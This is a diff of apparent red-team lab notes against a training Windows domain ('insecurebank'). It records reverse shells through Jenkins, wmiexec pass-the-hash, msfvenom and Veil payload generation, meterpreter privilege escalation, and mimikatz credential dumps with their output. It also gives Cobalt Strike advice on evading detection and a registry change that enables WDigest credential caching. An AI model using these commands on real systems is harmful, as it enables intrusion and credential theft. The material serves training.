@@ -341,7 +341,8 @@ user.name	DEV_SERVER$
 Running nmap against .12
 
 **** nmap output 10.59.4.12
-oot@kali:~/Downloads/22-c# nmap -sV 10.59.4.12
+#+BEGIN_EXAMPLE
+root@kali:~/Downloads/22-c# nmap -sV 10.59.4.12
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 09:07 UTC
 Nmap scan report for 10.59.4.12
 Host is up (0.10s latency).
@@ -363,7 +364,7 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 87.38 seconds
-
+#+END_EXAMPLE
 
 9:12 - uploaded CutePuppy.bat to .21
 tried to ~type~ the batch file, but it says 
@@ -465,7 +466,8 @@ did't work as dev_admin is likely only a local account
 
 *** domain users
 running ~net user /domain~ on .12
-c:\Program Files\Java\jre-10.0.1\bin>net user /domain
+
+=c:\Program Files\Java\jre-10.0.1\bin>net user /domain
 net user /domain
 The request will be processed at a domain controller for domain insecurebank.local.
 
@@ -485,7 +487,7 @@ The command completed with one or more errors.
 
 * Machines on the network
 
-.11 - kerberos, AD
+.11 - kerberos, AD \\DC1
 .12 - Jenkins slave, reverse root shell
 .13 - Apache Tomcat - vault, reverse root shell
 .14 - Jenkins - shell, 
@@ -493,21 +495,251 @@ The command completed with one or more errors.
 .16 - Windows server, RDP, netbios
 .17 - windows server, RDP, netbios
 
-** 10.59.4.16 - Windows Server
-11:27 - connected via wmiexec using admin and the above hash
-
 ** Jenkins 
 
 we connected via a simple reverse shell with groovy script pasted in Jenkins shell
-Then were able to look into ~ (jenkins home) directory
+Then were able to look into ~ (jenkins home) directory and find a ~secrets~ file
 
-** Cobalt strike
+We could have also added a local user through jenkins shell and log in through wmiexec 
+
+
+** 10.59.4.16 - Windows Server
+11:27 - connected via wmiexec using admin and the above hash
+11:49 - there is xampp installed, has a list of default passwords
+c:\xampp\tmp has a couple of leftover files
+~whoami~ - intranet\administrator
+c:\xampp\mysql\data has some recently modified files
+
+
+apache seems to be started
+http://10.59.4.16/phpmyadmin
+
+I managed to kill apache somehow :(
+
+Says:
+**** Apache listing
+Access forbidden!
+
+New XAMPP security concept:
+
+Access to the requested object is only available from the local network.
+
+This setting can be configured in the file "httpd-xampp.conf".
+
+If you think this is a server error, please contact the webmaster.
+Error 403
+10.59.4.16
+Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.19 
+
+-> Should configure httpd-xampp.conf
+
+Config file is in httpd
+
+
+
+* Cobalt strike
 + Used by APT and Red Team
 + Has a built in C2
 + Windows based implant
 + Includes pivoting features
 + Implants include mimikatz & psexec/wmiexec
-
 + Used when a system is already compromised
-+ Shouldn't drop it as a first thing, go step by step, if they catch you, then you will burn your tools
-+ The main idea is to start like a script kiddie (something basic), then if it fails, go to the next weapon
+  * Shouldn't drop it as a first thing, go step by step, if they catch you, then you will burn your tools
+  * The main idea is to start like a script kiddie (something basic), then if it fails, go to the next weapon
++ Can be stealthy and communicate over periodical HTTP connections
+  * Can also run interactively, but that creates more noise
++ Has a team server
++ Beacons can proxy other beacons for less noise on the perimeter
+  * For example the domain controller may not have internet connection
+  * Can use named pipes / SMB to talk to each other
+  * SMB chaining
++ Different ways to deliver
++ can add targets manually / from nmap outputs
++ scanning
++ ticket functionality
+  * steal live kerberos tickets
+  * create tickets using compromised accounts credentials
+  * this is very difficult to detect (pass the ticket)
++ Tunneling
+  * SOCKS proxy
+  * Covert VPN
++ SLEEP Scripting language
++ Establishing persistence is key
++ demo:
+  * can generate a payload, host it and supply a one-liner to download it
+  * can generate various versions - macro, stageless, etc
+
+
+
+**** mimikatz 
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.59.4.101 LPORT=443 
+
+** TODO look at the credential guard and flaws
+
+generated new reverse shell with:
+veil
+use 29)	python/shellcode_inject/aes_encrypt.py
+generate
+shellcode: 2 (msfvenom)
+set up LHOST and LPORT
+- didn't work
+
+generated new reverse shell with
+veil
+use 7 - c/meterpreter/rev_tcp.py
+Pure C Reverse TCP Stager
+set up LHOST and LPORT
+deploy with wmiexec shell
+executed ~see.exe~
+
+now in meterpreter I got system ~getsystem~, then I loaded mimikatz - ~load mimikatz~
+running mimikatz, executed ~msv~
+
+**** msv output on .16
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID     Package    Domain          User           Password
+------     -------    ------          ----           --------
+0;1802806  Kerberos   insecurebank    bob            mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;1584398  Negotiate  Window Manager  DWM-2          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;51773    Negotiate  Window Manager  DWM-1          mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;996      Negotiate  insecurebank    INTRANET$      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;997      Negotiate  NT AUTHORITY    LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;30430    NTLM                                      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+0;999      Negotiate  insecurebank    INTRANET$      mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Only part of a ReadProcessMemory or WriteProcessMemory request was completed. n.a. (msv1_0 KO)
+
+*Looks like we could get bob's credentials*
+
+I should migrate to a 64-bit process
+- see.exe is shown as x86
+
+**** ps output
+meterpreter > ps
+
+Process List
+============
+
+ PID    PPID   Name                  Arch  Session  User                          Path
+ ---    ----   ----                  ----  -------  ----                          ----
+ 0      0      [System Process]                                                   
+ 4      0      System                x64   0                                      
+ 208    4      smss.exe              x64   0                                      
+ 300    292    csrss.exe             x64   0                                      
+ 352    344    csrss.exe             x64   1                                      
+ 360    292    wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+ 388    344    winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 448    360    services.exe          x64   0                                      
+ 456    360    lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 512    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 552    448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 564    448    GRRservice.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\GRR\3.1.0.2\GRRservice.exe
+ 612    448    spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 644    388    LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
+ 660    388    dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
+ 672    448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 724    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 784    448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 836    448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 844    448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 1000   448    svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1052   564    GRR.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\GRR\3.1.0.2\GRR.exe
+ 1088   448    splunkd.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
+ 1252   1088   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 1256   2068   csrss.exe             x64   2                                      
+ 1276   448    sysmon.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\sysmon.exe
+ 1304   724    taskhostex.exe        x64   2        insecurebank\bob              C:\Windows\System32\taskhostex.exe
+ 1340   448    svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1380   448    winlogbeat.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
+ 1484   448    wlms.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlms\wlms.exe
+ 1532   448    nssm.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\nssm.exe
+ 1612   2676   rdpclip.exe           x64   2        insecurebank\bob              C:\Windows\System32\rdpclip.exe
+ 2052   448    msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+ 2208   1088   splunk-winevtlog.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe
+ 2416   512    unsecapp.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\unsecapp.exe
+ 2440   2068   winlogon.exe          x64   2        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 2676   448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 2796   448    svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 3092   2440   dwm.exe               x64   2        Window Manager\DWM-2          C:\Windows\System32\dwm.exe
+ 4028   4004   explorer.exe          x64   2        insecurebank\bob              C:\Windows\explorer.exe
+ 4396   5100   iexplore.exe          x86   2        insecurebank\bob              C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
+ 4752   4028   xampp-control.exe     x86   2        insecurebank\bob              C:\xampp\xampp-control.exe
+ 5100   4028   iexplore.exe          x64   2        insecurebank\bob              C:\Program Files\Internet Explorer\iexplore.exe
+ 5664   4028   mmc.exe               x64   2        insecurebank\bob              C:\Windows\System32\mmc.exe
+ 5724   2404   cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
+ 5764   5724   conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 5812   5724   powershell.exe        x64   0        INTRANET\Administrator        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 6080   5352   mmc.exe               x64   2        insecurebank\bob              C:\Windows\System32\mmc.exe
+ 8972   10608  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
+ 10916  8972   conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 11500  12064  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
+ 11540  10608  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
+ 11548  11540  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 11872  11500  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 14552  1532   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 14624  512    WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
+ 14712  14580  cmd.exe               x64   0        INTRANET\Administrator        C:\Windows\System32\cmd.exe
+ 14920  15180  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 14936  14624  powershell.exe        x64   0        INTRANET\Administrator        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 14948  14712  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 14980  1532   xampp_start.exe       x86   0        NT AUTHORITY\SYSTEM           c:\xampp\xampp_start.exe
+ 15108  14936  conhost.exe           x64   0        INTRANET\Administrator        C:\Windows\System32\conhost.exe
+ 15180  14936  powershell.exe        x86   0        INTRANET\Administrator        c:\windows\syswow64\windowspowershell\v1.0\powershell.exe
+ 15232  14712  see.exe               x86   0        INTRANET\Administrator        C:\xampp\see.exe
+
+**** migrating to a process
+
+migrate 5724
+
+then credentials:
+kerberos credentials
+====================
+
+AuthID     Package    Domain          User           Password
+------     -------    ------          ----           --------
+0;1802806  Kerberos   insecurebank    bob            
+0;996      Negotiate  insecurebank    INTRANET$      
+0;997      Negotiate  NT AUTHORITY    LOCAL SERVICE  
+0;30430    NTLM                                      
+0;1584398  Negotiate  Window Manager  DWM-2          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
+0;51773    Negotiate  Window Manager  DWM-1          96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
+0;999      Negotiate  insecurebank    INTRANET$      96 53 64 a4 e5 87 dc f8 c1 81 dd 0b 84 c0 8a 64 c9 4e 76 5a 73 79 63 d4 8f 4f 14 8e cd 5c ba 8e 50 32 9f 59 59 90 0f da 2a 55 eb 23 7d 33 0f 77 4a 97 6c ce 65 5d 68 43 f6 10 a8 3c 45 33 c7 79 19 c0 c5 3f 1e 69 79 04 e2 96 71 0e 38 5e 3c 67 bb 75 2f e4 54 f0 1b 67 98 1c 25 83 8d 1c 17 ad df 09 b1 c1 f3 84 e3 a8 78 2c 88 b1 07 f8 12 6a c2 c1 a5 44 7a 4e 72 f0 88 97 64 9d 61 9b b3 9c f2 ff 84 30 58 2f 71 e3 d7 bb b7 6c fe 35 89 8d cb bc fd 0f d9 cf f8 09 68 6b 41 c4 0e 71 71 96 1e 9f 41 60 39 34 85 39 2a f8 fb 15 be 35 48 16 32 22 b8 56 b9 ed 81 5a 54 a1 66 74 f1 72 89 89 1a ae 88 c8 82 a7 8a e7 48 69 44 de d9 c5 f4 86 4b 64 82 75 e9 37 07 80 75 47 fd bb 44 57 9a 19 28 83 a3 d3 ab c9 15 24 fd bb 6e f7 5b 35 c9 b9 
+
+msv credentials
+meterpreter > mimikatz_command -f sekurlsa::msv
+"0;88329138","Negotiate","Administrator","INTRANET","n.a. (msv1_0 KO)"
+"0;1802806","Kerberos","bob","insecurebank","n.a. (msv1_0 KO)"
+"0;1584398","Negotiate","DWM-2","Window Manager","n.a. (msv1_0 KO)"
+"0;51773","Negotiate","DWM-1","Window Manager","n.a. (msv1_0 KO)"
+"0;996","Negotiate","INTRANET$","insecurebank","n.a. (msv1_0 KO)"
+"0;997","Negotiate","LOCAL SERVICE","NT AUTHORITY","n.a. (msv1_0 KO)"
+"0;30430","NTLM","","","n.a. (msv1_0 KO)"
+"0;999","Negotiate","INTRANET$","insecurebank","n.a. (msv1_0 KO)"
+
+
+bob seems to be a domain admin
+Domain admins should not be allowed to log in to admins
+
+*** getting the address of the domain controller
+
+C:\users\bob\desktop>nltest /DCLIST:insecurebank
+nltest /DCLIST:insecurebank
+Get list of DCs in domain 'insecurebank' from '\\DC1'.
+You don't have access to DsBind to insecurebank (\\DC1) (Trying NetServerEnum).
+List of DCs in Domain insecurebank
+    \\DC1 (PDC)
+The command completed successfully
+
+Proxy:
+meterpreter > getproxy
+Auto-detect     : No
+Auto config URL : 
+Proxy URL       : http://10.59.6.11:80
+Proxy Bypass    : 
+
+Attempted to change the wdigest setting on 
+https://www.trustedsec.com/2015/04/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/
+
+meterpreter > reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -d 1 
+Successfully set UseLogonCredential of REG_SZ.
